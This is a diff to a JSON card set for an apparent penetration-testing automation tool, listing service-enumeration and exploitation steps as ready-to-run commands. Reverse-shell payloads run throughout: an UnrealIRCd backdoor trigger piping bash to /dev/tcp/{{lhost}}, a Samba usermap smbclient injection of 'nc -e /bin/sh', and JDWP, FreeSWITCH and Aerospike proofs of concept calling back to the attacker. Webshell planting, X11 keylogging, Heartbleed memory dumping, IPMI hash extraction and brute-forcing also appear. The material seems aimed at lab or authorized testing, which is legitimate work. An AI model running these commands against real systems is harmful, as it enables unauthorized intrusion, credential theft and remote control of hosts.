@@ -1,10 +1,15 @@
 {
   "id": "recon_2026_09",
   "title": "Recon / Service Enumeration",
-  "source": "Project-authored (obol-local). Common-knowledge service-enumeration methodology; independent expression, not derived from any third-party card set. References cite public tool docs / HackTricks.",
-  "license": "Project-authored data (obol-local). No third-party copyleft obligation.",
+  "source": "Project-authored. Common-knowledge service-enumeration methodology; independent expression, not derived from any third-party card set. References cite public tool docs / HackTricks.",
+  "license": "Project-authored data. No third-party copyleft obligation.",
   "actions": [
     {
+      "diagnostic": true,
+      "eliminates": [
+        "smb-anon-access",
+        "ad-user-enum"
+      ],
       "id": "recon-smb-anon",
       "title": "Anonymous SMB Enumeration",
       "hypothesis": "445/139 is worth probing before anything else: many hosts still allow a null or guest session, which hands you the share list, a RID-cycled account list, and occasionally readable files, all without a credential. Cheap, quiet, and often the first real lead.",
@@ -23,6 +28,9 @@
       "produces": [
         "smb.shares",
         "ad.user_list"
+      ],
+      "obsoleted_by": [
+        "blocker.smb_null_denied"
       ],
       "priority": 74,
       "phase": "enum",
@@ -65,9 +73,14 @@
           "run": "enum4linux-ng -A {{target}}",
           "note": "One-shot sweep of shares, users, groups, and password policy over RPC."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
+      "diagnostic": true,
+      "eliminates": [
+        "web-stack"
+      ],
       "id": "recon-web-triage",
       "title": "Web Service Triage",
       "hypothesis": "Fingerprint the stack before you fuzz it. The server, framework, and any CMS decide which wordlist and which checks are worth running; guessing blind wastes the noisy budget you'd rather spend once you know what you're looking at.",
@@ -110,7 +123,8 @@
           "run": "curl -sSI http://{{target}}",
           "note": "Raw response headers, server banner, powered-by, redirects, and cookies at a glance."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "recon-dns",
@@ -151,9 +165,15 @@
           "run": "dnsrecon -d {{domain}} -n {{target}} -a",
           "note": "Standard record enumeration plus the AXFR attempt in a single run."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
+      "diagnostic": true,
+      "eliminates": [
+        "snmp-access",
+        "ad-user-enum"
+      ],
       "id": "recon-snmp",
       "title": "SNMP Enumeration",
       "hypothesis": "UDP/161 is slow to scan and routinely skipped, so it's a favourite hiding spot for useful data. Find a readable community string ('public' is the usual first guess) and the MIB leaks processes, accounts, routes, and sometimes credentials embedded in config values.",
@@ -201,7 +221,8 @@
           "run": "snmp-check {{target}} -c public",
           "note": "A tidier, sectioned view, accounts, processes, network, installed software."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "recon-ike-vpn",
@@ -244,8 +265,14 @@
           "tool": "psk-crack",
           "run": "psk-crack -d {{wordlist}} ike-psk.txt",
           "note": "Dictionary-crack the captured hash offline."
+        },
+        {
+          "tool": "hashcat",
+          "run": "hashcat -m 5400 {{hashfile}} {{wordlist}}",
+          "note": "Hashcat mode 5400 (IKE PSK MD5 / SHA): Fast offline GPU dictionary attack on captured aggressive mode IKE pre-shared key hashes."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "recon-finger",
@@ -283,7 +310,8 @@
           "run": "finger root@{{target}}",
           "note": "Probe a named account to confirm it exists and read its shell/home."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "recon-vnc",
@@ -300,7 +328,10 @@
         "port:5901",
         "port:5800"
       ],
-      "produces": [],
+      "produces": [
+        "service.vnc",
+        "access.desktop"
+      ],
       "priority": 50,
       "phase": "enum",
       "autonomy": "manual",
@@ -329,7 +360,8 @@
           "run": "vncviewer {{target}}:5900",
           "note": "Connect manually, this is where access is actually confirmed, by hand."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "vnc-desktop-shell",
@@ -350,7 +382,7 @@
         "foothold.linux"
       ],
       "priority": 52,
-      "proves": "command execution from the VNC desktop session \u2014 a foothold",
+      "proves": "command execution from the VNC desktop session — a foothold",
       "does_not_prove": "privilege beyond the desktop user; escalate from the shell",
       "report": {
         "finding": "Interactive VNC Desktop Access",
@@ -368,11 +400,21 @@
         {
           "tool": "xdotool",
           "run": "id; hostname; ip -4 addr | grep inet",
-          "note": "In the desktop's terminal, run this and screenshot the frame \u2014 that captures the foothold with host identity. From here enumerate for root exactly like any shell."
+          "note": "In the desktop's terminal, run this and screenshot the frame — that captures the foothold with host identity. From here enumerate for root exactly like any shell."
+        },
+        {
+          "tool": "vncpwd",
+          "run": "vncpwd -s {{vnc_hex_pass}}",
+          "note": "TightVNC / UltraVNC password decryption: Decrypts DES-obfuscated VNC passwords recovered from registry or vncpwd configuration files."
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
+      "diagnostic": true,
+      "eliminates": [
+        "smtp-user-enum"
+      ],
       "id": "recon-smtp",
       "title": "SMTP User Enumeration",
       "hypothesis": "A mail server that honours VRFY/EXPN/RCPT will confirm which usernames are real, a quiet oracle that feeds a spray list. An open relay, if present, is a separate finding worth its own note.",
@@ -411,7 +453,8 @@
           "run": "swaks --to test@{{domain}} --server {{target}}",
           "note": "Drive a manual transaction, which also reveals relay behaviour."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "recon-ftp",
@@ -457,7 +500,8 @@
           "run": "ftp {{target}}",
           "note": "Interactive session: log in anonymous/anonymous, then ls, get, and test put for a writable directory."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "recon-mail",
@@ -475,7 +519,10 @@
         "port:993",
         "port:995"
       ],
-      "produces": [],
+      "produces": [
+        "service.mail",
+        "ad.domain_known"
+      ],
       "priority": 52,
       "phase": "enum",
       "proves": "the mail service's version + capabilities, and any NTLM-disclosed domain/host",
@@ -502,9 +549,10 @@
         {
           "tool": "curl",
           "run": "curl -k --url \"imaps://{{target}}\" --user '{{user}}:{{password}}'",
-          "note": "With a held credential, list the mailbox (imaps for IMAP, pop3s://\u2026/1 for POP3). Mail is a classic place to find further creds/reset links."
+          "note": "With a held credential, list the mailbox (imaps for IMAP, pop3s://…/1 for POP3). Mail is a classic place to find further creds/reset links."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "rdp-enum",
@@ -520,7 +568,10 @@
         "rdp.reachable",
         "port:3389"
       ],
-      "produces": [],
+      "produces": [
+        "rdp.reachable",
+        "credential.validated"
+      ],
       "priority": 54,
       "phase": "enum",
       "autonomy": "approve",
@@ -560,7 +611,8 @@
           "run": "xfreerdp /v:{{target}} /u:{{user}} /p:'{{password}}' +clipboard /dynamic-resolution /cert:ignore",
           "note": "Open the interactive session, this is where desktop access is actually taken (use /pth:{{nthash}} instead of /p for pass-the-hash)."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "nfs-enum",
@@ -576,7 +628,8 @@
         "port:2049"
       ],
       "produces": [
-        "loot.files"
+        "loot.files",
+        "nfs.reachable"
       ],
       "priority": 52,
       "phase": "enum",
@@ -605,7 +658,8 @@
           "run": "mkdir -p /mnt/nfs && sudo mount -t nfs {{target}}:/{{export}} /mnt/nfs -o nolock",
           "note": "Mount an export read it. On a no_root_squash export you can plant a SUID-root binary from your box and execute it on the target for root."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "nfs-to-foothold",
@@ -628,7 +682,7 @@
         "foothold.linux"
       ],
       "priority": 58,
-      "proves": "a shell from a reachable NFS export \u2014 a looted or planted SSH key, or a webshell on a writable share",
+      "proves": "a shell from a reachable NFS export — a looted or planted SSH key, or a webshell on a writable share",
       "does_not_prove": "a shell when exports are squashed and hold nothing sensitive; no_root_squash is the stronger, separate privesc",
       "report": {
         "finding": "Sensitive/Writable NFS Export",
@@ -648,7 +702,8 @@
           "run": "sudo mount -t nfs {{target}}:{{export}} /mnt/nfs -o nolock",
           "note": "Mount it. Read a home for an id_rsa to SSH in with, or (matching the owner's UID locally) write ~/.ssh/authorized_keys and then SSH: ssh -i key <user>@{{target}}; `id` confirms the foothold."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "recon-telnet",
@@ -664,7 +719,9 @@
       "requires_any": [
         "port:23"
       ],
-      "produces": [],
+      "produces": [
+        "telnet.reachable"
+      ],
       "priority": 50,
       "autonomy": "manual",
       "proves": "a reachable cleartext login service and whatever its banner discloses",
@@ -692,7 +749,8 @@
           "run": "hydra -L users.txt -P passwords.txt telnet://{{target}}",
           "note": "Brute a known user list once the banner suggests the service is worth it; telnet locks out rarely."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "telnet-login",
@@ -714,7 +772,7 @@
         "foothold.linux"
       ],
       "priority": 60,
-      "proves": "an interactive login shell on the target over telnet \u2014 a foothold",
+      "proves": "an interactive login shell on the target over telnet — a foothold",
       "does_not_prove": "privilege beyond that account; escalate from the shell for the root flag",
       "report": {
         "finding": "Cleartext Telnet Login",
@@ -729,9 +787,10 @@
         {
           "tool": "hydra",
           "run": "hydra -L {{userlist}} -P {{wordlist}} telnet://{{target}}",
-          "note": "No credential yet? Brute it \u2014 telnet boxes lean on weak/default logins. A [23][telnet] host: ... login: ... password: ... line is your way in; then use the first command."
+          "note": "No credential yet? Brute it — telnet boxes lean on weak/default logins. A [23][telnet] host: ... login: ... password: ... line is your way in; then use the first command."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "recon-rservices",
@@ -750,7 +809,9 @@
         "port:513",
         "port:514"
       ],
-      "produces": [],
+      "produces": [
+        "rservices.reachable"
+      ],
       "priority": 50,
       "autonomy": "manual",
       "proves": "whether the host trusts your connection for a password-free login",
@@ -778,7 +839,8 @@
           "run": "rsh -l root {{target}} id",
           "note": "Run one command over rsh: if a trust entry covers you, this returns uid=0 with no password prompt."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "rservices-login",
@@ -803,7 +865,7 @@
         "access.admin"
       ],
       "priority": 60,
-      "proves": "a trusted-login shell over rlogin/rsh \u2014 a foothold, and root directly when the trust names root",
+      "proves": "a trusted-login shell over rlogin/rsh — a foothold, and root directly when the trust names root",
       "does_not_prove": "a shell when no .rhosts trust exists for your source; then fall back to a credential login",
       "report": {
         "finding": "Passwordless r-services Trust Login",
@@ -820,7 +882,8 @@
           "run": "rsh {{target}} -l root id",
           "note": "The rsh form runs a single command across the trust; `uid=0(root)` confirms a passwordless root foothold."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "recon-rsync",
@@ -836,7 +899,8 @@
         "port:873"
       ],
       "produces": [
-        "loot.files"
+        "loot.files",
+        "rsync.reachable"
       ],
       "priority": 58,
       "autonomy": "auto",
@@ -866,7 +930,8 @@
           "run": "rsync -av rsync://{{target}}/{{module}}/ loot/rsync-{{module}}/",
           "note": "Pull the module down to your loot directory, then grep it for secrets."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "rsync-write-shell",
@@ -888,7 +953,7 @@
         "foothold.linux"
       ],
       "priority": 58,
-      "proves": "code execution from a writable rsync module \u2014 a foothold via a planted key or webshell",
+      "proves": "code execution from a writable rsync module — a foothold via a planted key or webshell",
       "does_not_prove": "a shell when every module is read-only or sandboxed away from a useful path",
       "report": {
         "finding": "Writable rsync Module",
@@ -913,7 +978,8 @@
           "run": "ssh -i {{keyfile}} {{user}}@{{target}} id",
           "note": "Confirm the planted-key login lands a shell; `uid=...` is your foothold."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "recon-tftp",
@@ -929,7 +995,8 @@
         "port:69"
       ],
       "produces": [
-        "loot.files"
+        "loot.files",
+        "tftp.reachable"
       ],
       "priority": 48,
       "autonomy": "approve",
@@ -954,7 +1021,8 @@
           "run": "tftp {{target}}",
           "note": "Interactive session: set the mode, then `get <file>` for device configs (e.g. running-config, startup-config, phone cfg files)."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "tftp-write-shell",
@@ -996,7 +1064,8 @@
           "run": "curl \"http://{{target}}/shell.php?c=id\"",
           "note": "If the TFTP root was the web root, your file is now served: run a command. `uid=...` is the foothold; swap in a reverse shell and catch it with the listener card."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "recon-x11",
@@ -1013,7 +1082,8 @@
         "port:6000"
       ],
       "produces": [
-        "loot.material"
+        "loot.material",
+        "x11.reachable"
       ],
       "priority": 46,
       "autonomy": "manual",
@@ -1042,7 +1112,8 @@
           "run": "DISPLAY={{target}}:0 xdotool getwindowfocus getwindowname",
           "note": "Read the focused window (xdotool reads the X server from DISPLAY, not a flag); from here key-logging and input injection follow."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "x11-keylog",
@@ -1064,7 +1135,7 @@
         "credential.candidate"
       ],
       "priority": 50,
-      "proves": "secrets visible on the victim's desktop and keystrokes it typed \u2014 candidate credentials",
+      "proves": "secrets visible on the victim's desktop and keystrokes it typed — candidate credentials",
       "does_not_prove": "a shell by itself; the captured password still has to be used on SSH/su/sudo",
       "report": {
         "finding": "Unauthenticated X11 Session Access",
@@ -1077,14 +1148,15 @@
         {
           "tool": "xwd",
           "run": "xwd -root -display {{target}}:0 -out screen.xwd && convert screen.xwd screen.png",
-          "note": "Grab the current screen \u2014 terminals, password managers and chat windows routinely show secrets. Eyeball screen.png."
+          "note": "Grab the current screen — terminals, password managers and chat windows routinely show secrets. Eyeball screen.png."
         },
         {
           "tool": "xdotool",
           "run": "xspy {{target}}:0",
           "note": "Log keystrokes from the session. Watch for the sudo/su password being typed; that single capture is often the whole path to root. Paste what you capture and obol records the candidate credential."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "ftp-upload-webshell",
@@ -1129,7 +1201,8 @@
           "run": "curl \"http://{{target}}/shell.php?c=id\"",
           "note": "Request the uploaded script to execute it; a returned uid is your proof of RCE."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "ssh-user-enum",
@@ -1184,6 +1257,7 @@
     },
     {
       "id": "smtp-open-relay",
+      "speculative": true,
       "title": "SMTP Open-Relay Test",
       "phase": "recon",
       "hypothesis": "A mail server that forwards messages for senders and recipients outside the domains it serves is an open relay, a reportable misconfiguration and a lever for phishing or internal spoofing. You confirm it by offering a MAIL FROM and a RCPT TO that are both external and watching for a 250 accept instead of a 550 refusal. It gives no shell, but it is a finding on its own and sometimes sets up a credential-harvesting email to a real user. It is distinct from VRFY and EXPN user enumeration on the same port.",
@@ -1229,7 +1303,8 @@
           "run": "telnet {{target}} 25",
           "note": "By hand: HELO x, MAIL FROM a@external.net, RCPT TO b@gmail.com; a 250 on the recipient confirms it."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "ftp-bounce",
@@ -1276,7 +1351,8 @@
           "run": "nmap -b anonymous:anonymous@{{target}} -p 1-1000 172.16.5.10",
           "note": "Let nmap run the whole bounce scan: -b is the FTP relay, the trailing host is the internal target."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "vsftpd-backdoor",
@@ -1327,7 +1403,8 @@
           "run": "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {{target}}; run\"",
           "note": "The Metasploit module automates the trigger and the 6200 connect."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "proftpd-modcopy",
@@ -1377,7 +1454,8 @@
           "run": "curl 'http://{{target}}/shell.php?cmd=id'",
           "note": "After copying a PHP payload into the web root, call it. Swap id for a reverse-shell one-liner once it responds. Start nc -lvnp 4444 first."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "samba-usermap",
@@ -1428,7 +1506,8 @@
           "run": "msfconsole -q -x \"use exploit/multi/samba/usermap_script; set RHOSTS {{target}}; set LHOST {{lhost}}; run\"",
           "note": "The Metasploit module is the reliable alternative if the manual injection is awkward."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "smbghost",
@@ -1478,7 +1557,8 @@
           "run": "python3 SMBGhost_RCE.py -ip {{target}}",
           "note": "chompie1337's RCE proof of concept; edit the embedded shellcode to call back to {{lhost}}. It can BSOD the host, so snapshot first."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "bluekeep",
@@ -1523,7 +1603,8 @@
           "run": "msfconsole -q -x \"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {{target}}; set LHOST {{lhost}}; run\"",
           "note": "Set the correct target arch and VM profile; the wrong one BSODs the host instead of landing a shell."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "freeswitch-esl",
@@ -1572,7 +1653,8 @@
           "run": "python3 47799.py {{target}} 'nc {{lhost}} 4444 -e /bin/sh'",
           "note": "The PoC wraps auth and a reverse shell; start nc -lvnp 4444 first."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "jdwp-debug",
@@ -1623,7 +1705,8 @@
           "run": "python2 jdwp-shellifier.py -t {{target}} -p 8000 --cmd 'busybox nc {{lhost}} 4444 -e /bin/bash'",
           "note": "Runs as the JVM user; if JDWP is bound to localhost, reach it through a chisel or ligolo pivot. Start nc -lvnp 4444 first."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "aerospike-udf",
@@ -1675,7 +1758,8 @@
           "run": "python3 aerospike_UDF_RCE.py --ahost {{target}} --aport 3000 --lhost {{lhost}} --lport 4444 --command rev",
           "note": "Start nc -lvnp 4444 first; the UDF runs as the aerospike user."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "wifi-mouse-rce",
@@ -1720,11 +1804,12 @@
           "run": "python3 50972.py {{target}} {{lhost}} 4444",
           "note": "The PoC sends unauthenticated file-exec events to run a reverse shell; start nc -lvnp 4444 first."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "nmap-host-unresponsive",
-      "title": "Nmap Says Host Is Down \u2014 Make It Answer",
+      "title": "Nmap Says Host Is Down — Make It Answer",
       "tool": "nmap",
       "tools": [
         "nmap"
@@ -1763,11 +1848,12 @@
           "run": "nmap -Pn -sT --source-port 53 {{target}}",
           "note": "If SYN scans are filtered, a full-connect scan (-sT) or a trusted source port (53/443) can slip past a stateless firewall."
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "fix-name-resolution",
-      "title": "Could Not Resolve Host \u2014 Add It to /etc/hosts",
+      "title": "Could Not Resolve Host — Add It to /etc/hosts",
       "tool": "sh",
       "tools": [
         "sh"
@@ -1799,7 +1885,304 @@
         {
           "tool": "sh",
           "run": "curl -s -H 'Host: {{hostname}}' http://{{target}}/",
-          "note": "If a name resolves but the site shows a default page, it is virtual-host routed: the real site only answers to the right Host header \u2014 feed that name to vhost/content discovery."
+          "note": "If a name resolves but the site shows a default page, it is virtual-host routed: the real site only answers to the right Host header — feed that name to vhost/content discovery."
+        }
+      ],
+      "requires_any": []
+    },
+    {
+      "id": "http3-quic-probe",
+      "title": "HTTP/3 and QUIC Protocol Service Probing",
+      "hypothesis": "Modern web servers or HTTP proxies may expose services exclusively or additionally over UDP port 443 running QUIC/HTTP/3. Standard TCP scanners miss these unless probed via UDP nmap scripts, quiche-client, or curl compiled with HTTP/3 support.",
+      "tool": "nmap",
+      "tools": [
+        "nmap",
+        "curl",
+        "quiche-client"
+      ],
+      "os": [],
+      "phase": "recon",
+      "requires_any": [
+        "http.reachable",
+        "port:443"
+      ],
+      "produces": [
+        "web.server",
+        "service.http3"
+      ],
+      "priority": 48,
+      "autonomy": "safe",
+      "sequence": true,
+      "proves": "HTTP/3 and QUIC protocol support on target UDP ports",
+      "does_not_prove": "application vulnerabilities until virtual hosts and endpoints are enumerated",
+      "report": {
+        "finding": "HTTP/3 QUIC Service Discovery",
+        "severity": "info"
+      },
+      "refs": [
+        "https://curl.se/docs/http3.html"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -sU -p 443 --script quic-info {{target}}",
+          "note": "Probes UDP port 443 for QUIC versions and server parameters."
+        },
+        {
+          "tool": "curl",
+          "run": "curl --http3-only -vk https://{{target}}:443/",
+          "note": "Sends HTTP/3 GET request to inspect headers and virtual hosts."
+        },
+        {
+          "tool": "quiche-client",
+          "run": "quiche-client https://{{target}}:443",
+          "note": "Interacts with QUIC HTTP/3 endpoints using Cloudflare quiche."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "ipmi-bmc-cipher0",
+      "title": "IPMI BMC Cipher Suite 0 Bypass and Hash Extraction",
+      "hypothesis": "Intelligent Platform Management Interface (IPMI) 2.0 services exposed on UDP 623 that support Cipher Suite 0 allow authentication bypass. Unauthenticated clients can also issue RAKP messages to extract valid user password hashes for offline cracking (Hashcat mode 7300).",
+      "tool": "ipmitool",
+      "tools": [
+        "ipmitool",
+        "nmap",
+        "msfconsole",
+        "hashcat"
+      ],
+      "os": [],
+      "phase": "recon",
+      "requires_any": [
+        "port:623"
+      ],
+      "produces": [
+        "credential.available",
+        "credential.hash"
+      ],
+      "priority": 68,
+      "autonomy": "safe",
+      "sequence": true,
+      "proves": "IPMI authentication bypass or RAKP hash extraction on target UDP 623",
+      "does_not_prove": "OS shell access until credentials or BMC console are authenticated",
+      "report": {
+        "finding": "IPMI 2.0 Cipher Suite 0 / RAKP Hash Disclosure",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.cvedetails.com/cve/CVE-2013-4786/"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -sU -p 623 --script ipmi-version,ipmi-cipher-zero {{target}}",
+          "note": "Identifies IPMI version and tests for Cipher Suite 0 authentication bypass support."
+        },
+        {
+          "tool": "ipmitool",
+          "run": "ipmitool -I lanplus -C 0 -H {{target}} -U admin user list",
+          "note": "Attempts Cipher Suite 0 bypass to list BMC user accounts."
+        },
+        {
+          "tool": "msfconsole",
+          "run": "msfconsole -q -x \"use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {{target}}; run; exit\"",
+          "note": "Dumps IPMI 2.0 RAKP password hashes for all valid BMC users."
+        },
+        {
+          "tool": "hashcat",
+          "run": "hashcat -m 7300 {{hashes_file}} /usr/share/wordlists/rockyou.txt",
+          "note": "Cracks dumped IPMI RAKP HMAC-SHA1 hashes offline using Hashcat mode 7300."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "unrealircd-backdoor",
+      "title": "UnrealIRCd 3.2.8.1 Malicious Backdoor RCE (CVE-2010-2075)",
+      "hypothesis": "UnrealIRCd version 3.2.8.1 downloaded between November 2009 and June 2010 contained a malicious backdoor. Sending a message beginning with 'AB;' followed by system commands to the IRC service port (default 6667 or 6697) triggers immediate shell command execution as the IRC service user.",
+      "tool": "nc",
+      "tools": [
+        "nc",
+        "python3"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "access",
+      "requires_any": [
+        "port:6667",
+        "port:6697",
+        "service.irc"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 84,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "unauthenticated remote command execution via UnrealIRCd AB; backdoor trigger",
+      "does_not_prove": "exploitation on authentic unbackdoored UnrealIRCd builds",
+      "report": {
+        "finding": "UnrealIRCd 3.2.8.1 Remote Code Execution Backdoor (CVE-2010-2075)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2010-2075"
+      ],
+      "commands": [
+        {
+          "tool": "nc",
+          "run": "echo 'AB; id' | nc -vn {{target}} {{port}}",
+          "note": "Sends backdoor trigger 'AB;' followed by id command to the IRC service port."
+        },
+        {
+          "tool": "nc",
+          "run": "echo 'AB; bash -c \"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\"' | nc -vn {{target}} {{port}}",
+          "note": "Triggers reverse shell through the UnrealIRCd backdoor command pipeline."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "heartbleed-memory-leak",
+      "title": "OpenSSL Heartbleed Memory Disclosure (CVE-2014-0160)",
+      "hypothesis": "OpenSSL versions 1.0.1 through 1.0.1f suffer from a missing bounds check in the TLS heartbeat extension (Heartbleed). Unauthenticated attackers can request up to 64KB of server memory per heartbeat request, disclosing private keys, passwords, session tokens, and cleartext communications.",
+      "tool": "python3",
+      "tools": [
+        "python3",
+        "nmap"
+      ],
+      "os": [],
+      "phase": "recon",
+      "requires_any": [
+        "port:443"
+      ],
+      "produces": [
+        "credential.available",
+        "loot.credentials"
+      ],
+      "priority": 79,
+      "autonomy": "safe",
+      "sequence": true,
+      "proves": "server process memory disclosure via TLS Heartbeat extension bug",
+      "does_not_prove": "specific target credentials without repeated memory sampling and inspection",
+      "report": {
+        "finding": "OpenSSL TLS Heartbeat Information Disclosure (Heartbleed, CVE-2014-0160)",
+        "severity": "high"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2014-0160"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -p 443 --script ssl-heartbleed {{target}}",
+          "note": "Tests target TLS service for Heartbleed memory leakage vulnerability."
+        },
+        {
+          "tool": "python3",
+          "run": "python3 heartbleed.py {{target}} -p 443 -n 5 -o memory_leak.bin",
+          "note": "Sends repeated heartbeat requests and writes dumped memory segments to disk for credential extraction."
+        },
+        {
+          "tool": "python3",
+          "run": "strings memory_leak.bin | grep -Ei 'password|passwd|key|auth|token|session|id_rsa'",
+          "note": "Extracts credential candidates, SSH keys, and session material from the leaked memory dump."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "samba-usermap-script-rce",
+      "title": "Samba username map script Remote Command Execution",
+      "hypothesis": "Samba versions 3.0.0 through 3.0.25rc3 configure username map script execution without input validation (CVE-2007-2447). Passing backtick commands in the MS-RPC authentication username field executes arbitrary code as root.",
+      "tool": "smbclient",
+      "tools": [
+        "smbclient",
+        "nmap"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "vuln.samba_usermap",
+        "port:139",
+        "port:445"
+      ],
+      "produces": [
+        "foothold.shell",
+        "access.root"
+      ],
+      "priority": 95,
+      "phase": "access",
+      "proves": "achieves instant root command execution via Samba username map script injection",
+      "does_not_prove": "domain-level credentials on Active Directory integrated shares",
+      "report": {
+        "finding": "Samba username map script Command Execution (CVE-2007-2447)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/16320"
+      ],
+      "commands": [
+        {
+          "tool": "smbclient",
+          "run": "smbclient //{{target}}/tmp -N -c 'logon \"/=`nohup nc -e /bin/sh {{lhost}} {{lport}}`\"'",
+          "note": "Execute arbitrary commands via Samba 3.0.20 username map script buffer execution (CVE-2007-2447)."
+        },
+        {
+          "tool": "nmap",
+          "run": "nmap -p 139,445 --script smb-vuln-cve2007-2447 {{target}}",
+          "note": "Scan target SMB daemon to confirm presence of vulnerable Samba 3.0.20 release."
+        }
+      ]
+    },
+    {
+      "id": "snmp-process-cmdline-harvest",
+      "title": "SNMP Process Table Command-Line Credential Harvesting (hrSWRun)",
+      "hypothesis": "Target host exposes SNMP with a valid community string (e.g. public). Walking the Host Resources MIB process table (hrSWRunTable / 1.3.6.1.2.1.25.4.2.1) extracts full command lines and arguments of running tasks, leaking administrative credentials.",
+      "tool": "snmpbulkwalk",
+      "tools": [
+        "snmpbulkwalk",
+        "snmpwalk"
+      ],
+      "os": [
+        "linux",
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "port:161",
+        "service.snmp",
+        "snmp.community"
+      ],
+      "produces": [
+        "credential.plain",
+        "credential.candidate"
+      ],
+      "priority": 84,
+      "phase": "recon",
+      "proves": "discovers cleartext credentials passed in process execution arguments and scheduled scripts",
+      "does_not_prove": "administrative access until recovered credentials are authenticated",
+      "report": {
+        "finding": "Cleartext Credentials Exposed in Process Arguments via SNMP hrSWRun Table",
+        "severity": "high"
+      },
+      "refs": [
+        "https://oidref.com/1.3.6.1.2.1.25.4.2.1"
+      ],
+      "commands": [
+        {
+          "tool": "snmpbulkwalk",
+          "run": "snmpbulkwalk -v2c -c {{community}} {{target}} 1.3.6.1.2.1.25.4.2.1.2",
+          "note": "Query hrSWRunName OID branch to enumerate process executable names running on the target."
+        },
+        {
+          "tool": "snmpbulkwalk",
+          "run": "snmpbulkwalk -v2c -c {{community}} {{target}} 1.3.6.1.2.1.25.4.2.1.5",
+          "note": "Query hrSWRunParameters OID branch to dump command-line execution parameters leaking credentials."
         }
       ]
     }
